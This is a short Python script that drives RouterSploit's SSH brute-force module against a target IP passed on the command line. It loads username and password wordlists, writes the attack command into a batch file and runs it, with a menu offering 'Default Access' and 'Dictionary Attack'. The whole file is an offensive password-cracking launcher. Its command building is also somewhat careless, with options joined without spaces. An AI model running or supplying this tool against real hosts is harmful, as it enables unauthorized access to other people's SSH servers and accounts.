import sys
from subprocess import Popen

def default_accessd(usernames,target):
    passwords = open("wordlist.txt").read()

    with open("start_rsf.bat","w") as f:
        f.write("python3 rsf.py -m creds/generic/ssh_bruteforce -s"+target+" -s \"usernames "+usernames+"\" -s \"passwords "+passwords+"\"")
        

    run_batch("start_rsf.bat")


def brute_force(user,target):
    with open("start_rsf.bat","w") as f:
        f.write("python3 rsf.py -m creds/generic/ssh_bruteforce -s"+target+" -s \"usernames "+user+"\"")
    run_batch("start_rsf.bat")


def main():
    ip_addr = sys.argv[1]
    usernames = open("usernames.txt").read()
    target = "\"target "+ip_addr+"\""
    choice = input("\n\n1]Default Access\n2]Dictionary Attack\n3}Exit\n")

    if (choice == '1'):
       default_accessd(usernames,target)    
       main()      

    elif (choice == '2'):
        brute_force(usernames,target)
        main()

    else:
        print("\n\nExiting Password Cracking")
    

def run_batch(filepath):
    p = Popen(filepath)
    stdout, stderr = p.communicate()

if __name__=="__main__":
    main()